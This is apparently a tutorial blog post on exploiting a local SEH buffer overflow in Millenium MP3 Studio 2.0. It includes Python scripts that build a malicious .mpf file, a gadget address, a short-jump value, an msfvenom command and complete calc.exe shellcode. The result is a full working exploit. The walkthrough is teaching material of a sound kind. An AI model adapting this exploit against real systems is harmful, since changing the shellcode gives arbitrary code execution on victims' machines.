---
layout: single
title: Local SEH overflow - exploitation of Millenium MP3 Studio 2.0 with a calc.exe shellcode payload
---

The victim program for this walkthrough is `Millenium MP3 Studio 2.0`, it includes a local SEH based buffer overflow when opening certain sized files with specific file extensions.

Start by attaching an immunity debugger to the running MP3 Studio process. This will allow us to set breakpoints, and get a better understanding of how the application runs when we start to exploit it. 

![local seh 1](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/localseh/localseh1.png)

The basic concept for exploiting a local Structured Exception Handler based buffer overflow, is that you will create a malicious text file that includes the payload that you are going to manually enter into a vulnerable input field, or instead of a text file, you will generate a malicious payload embedded within something other than a text file, for example, this target application includes a buffer overflow when parsing certain types of data files, with a .mpf file extension, we will generate our malicious payload.

We can start the exploitation process by creating a basic python script that opens up a new file and inputs a large buffer of data into it. 10000 A's  is enough data to overwrite the user input buffer, and two write the excess data onto the applications memory stack, doing so will trigger the buffer overflow vulnerability.

```python
from struct import *

malicious_file = "evil.mpf"

payload = "A" * 10000 # the maliciously large buffer

try:
    print("[x] Opening the malicious file")
    payload_execution = open(malicious_file, "w+")
    print("[x] Creating a file named", malicious_file) 
    payload_execution.write(payload)
    print("[x] Adding payload to the malicious file")
    payload_execution.close()
except:
    print("[!] Error creating the exploit")
```

After running the newly-created script, you can now open this malicious .mpf  File in the MP3 Studio application, while the MP3 Studio application is still attached to immunity immunity. Now you should be able to witness the buffer overflow vulnerability being triggered, and you should experience an exception crash within the application.

![local seh 2](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/localseh/localseh2.png)

If you don't see the SEH chain handlers getting overwritten, try adjusting your payload size, this is the one *advantage* of fuzzing, but due to this exploit being trivial, we don't need to involve any complex fuzzers to find a proper payload size, it can be done manually/

If you look at the stack panel within Immunity, you can see the malicious payload has been written on to the stack.

![local seh 3](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/localseh/localseh3.png)

After adjusting the payload size down to 5000 bytes, now you can see if crashes, and also starts overwriting everything.

A few registers are also showing signs of being hit, but most importantly, the SEH handler tab shows you that both the SEH and NSEH have been both overwritten. This is the most important.

![seh handler hit](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/localseh/localseh7.png)

Now that you can trigger the vulnerability with a very large sized buffer, you want to calculate the buffer size to fill before overwriting any SEH handlers. You can use the Metasploit patter_create and pattern_offset tools to do this.

```
./pattern_create.rb -l 5000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0....
```
This will create a unique cyclic pattern that will allow you to spot and calculate the buffer size on the basis that if every few bytes of this string is unique, you can calculate where the overwritten data comes from in this unique pattern.

Include this string in your exploit, and run it all through Immunity again, when it crashes this time, use the `!mona findmsp` command to locate any overwritten SEH locations and registers, and see where they have been overwritten.

![local seh 6](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/localseh/localseh6.png)

In order to actually exploit this, you need to obtain a POP POP RET  gadget, this can be done with MONA.py  via the !seh -n  command. The POP POP RET sequence will be overwriting the SEH (structured exception handler in the SEH chain)

Running this command will search through the program for the needed sequence, this POPPOPRET sequence will return execution flow back to the structured exception Handler, the goal is to overwrite both the exception Handler and the next structured exception Handler. 

![local seh 4](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/localseh/localseh4.png)

And the structured exception Handler will be overwritten with this sequence that we discover, returning normal flow back to the user-controlled structured exception Handler.

As for the next structured exception Handler, you want to overwrite it with a short jump sequence, this can be denoted with the assembly opcodes 90 90 32 EB , In a reversed format to compensate for the little endian format that we need the memory addresses to be in.  Overriding the next structure exception Handler with this short jump, will allow for the execution flow to jump over the structured exception Handler. and the short jump will drop us into our NOPSLED.

```python
seh = pack ('<I',  0x10014E98) # POP POP RET from xaudio.dll - using !mona seh -n
nseh = pack ('<I', 0x909032EB) # Short jump over the POPPOPRET filled NSEH
```

Run these new addresses through struct.pack in order to arrange them properly with little endian format.

A NOPSELD is a short payload that is comprised of NOP  assembly instructions, these NOP  instructions do absolutely nothing, they can be used as a sort of Landing Zone padding for our jump. Including 10-15 NOPs as padding is usually enough.

Including the NOPSLED  after our short jump, will allow for a clean Shell Code execution, where our short jump will directly hit our shellcode without any errors, sometimes an application may have slight adjustments, so you want to compensate for anything by including a large area for the short jump to land in.

```
+----------------------+
| Filled input buffer  |
| ↓                    |
| Short JMP            |
| ↓                    |
| POP-POP-RET          |
| ↓                    |
| NOPSLED              |
| ↓                    |
| Shellcode payload    |
+----------------------+
```

## Shellcode and putting it all together

Now that we have a clean jump into a controlled area, we want to generate a  malicious shellcode payload via msfvenom, as for this proof-of-concept and this vulnerable application being a local based exploitation. to prove the code execution properties of this technique, we can generate a shellcode payload that spawns a calculator. 

`./msfvenom -p windows/exec CMD=calc.exe -b '\x00' -f c EXITFUNC=thread`

Our final payload is as seen below.

```python
from struct import *

malicious_file = "evil.mpf"

# Log data, item 36
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x0018f948 overwritten with normal pattern : 0x31684630 (offset 4112), followed by 1712 bytes of cyclic data after the handler

seh = pack ('<I',  0x10014E98) # POP POP RET from xaudio.dll - using !mona seh -n
nseh = pack ('<I', 0x909032EB) # Short jump over the POPPOPRET filled NSEH

# shellcode payload that is generated from msfvenom
shellcode = (
"\xdb\xc8\xba\x50\xf4\xd9\x51\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x31\x31\x56\x18\x83\xee\xfc\x03\x56\x44\x16\x2c\xad\x8c\x54"
"\xcf\x4e\x4c\x39\x59\xab\x7d\x79\x3d\xbf\x2d\x49\x35\xed\xc1"
"\x22\x1b\x06\x52\x46\xb4\x29\xd3\xed\xe2\x04\xe4\x5e\xd6\x07"
"\x66\x9d\x0b\xe8\x57\x6e\x5e\xe9\x90\x93\x93\xbb\x49\xdf\x06"
"\x2c\xfe\x95\x9a\xc7\x4c\x3b\x9b\x34\x04\x3a\x8a\xea\x1f\x65"
"\x0c\x0c\xcc\x1d\x05\x16\x11\x1b\xdf\xad\xe1\xd7\xde\x67\x38"
"\x17\x4c\x46\xf5\xea\x8c\x8e\x31\x15\xfb\xe6\x42\xa8\xfc\x3c"
"\x39\x76\x88\xa6\x99\xfd\x2a\x03\x18\xd1\xad\xc0\x16\x9e\xba"
"\x8f\x3a\x21\x6e\xa4\x46\xaa\x91\x6b\xcf\xe8\xb5\xaf\x94\xab"
"\xd4\xf6\x70\x1d\xe8\xe9\xdb\xc2\x4c\x61\xf1\x17\xfd\x28\x9f"
"\xe6\x73\x57\xed\xe9\x8b\x58\x41\x82\xba\xd3\x0e\xd5\x42\x36"
"\x6b\x29\x09\x1b\xdd\xa2\xd4\xc9\x5c\xaf\xe6\x27\xa2\xd6\x64"
"\xc2\x5a\x2d\x74\xa7\x5f\x69\x32\x5b\x2d\xe2\xd7\x5b\x82\x03"
"\xf2\x3f\x45\x90\x9e\x91\xe0\x10\x04\xee")

payload = "A" * 4112 # after calculating the buffer size that triggers this specific vulnerability
payload += nseh
payload += seh
payload += "\x90" * 100
payload += shellcode

# Log data, item 24
# Address=10014E98
# Message=  0x10014e98 : pop esi # pop ecx # ret  |  {PAGE_EXECUTE_READ} [xaudio.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.0.7.0 (c:\mp3-millennium\xaudio.dllpayload_execution = open(malicious_file, 'w+')

try:
    print("[x] Opening the malicious file")
    payload_execution = open(malicious_file, "w+")
    print("[x] Creating a file named", malicious_file) 
    payload_execution.write(payload)
    print("[x] Adding payload to the malicious file")
    payload_execution.close()
    print("[x] Sending junk")
    print("[x] Sending POP POP RET via controlled SEH handler")
    print("[x] Jumping to shellcode")
except:
    print("[!] Error creating the exploit")
```

Now you can pop a calculator through this local SEH overflow.

![local seh 5](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/localseh/localseh5.png)

## Conclusion

In this post we covered the exploitation of a local bass structured exception Handler buffer overflow vulnerability,  with the ability to craft malicious payloads in the form of .Mpf files, we had the ability  to obtain code execution through the vulnerable application. This was done by crashing, and calculating the input buffer size, and then we located  a POPPOPRET  sequence, followed by adding a short jumper assembly instruction, and our malicious shellcode payload  generated by msfvenom.
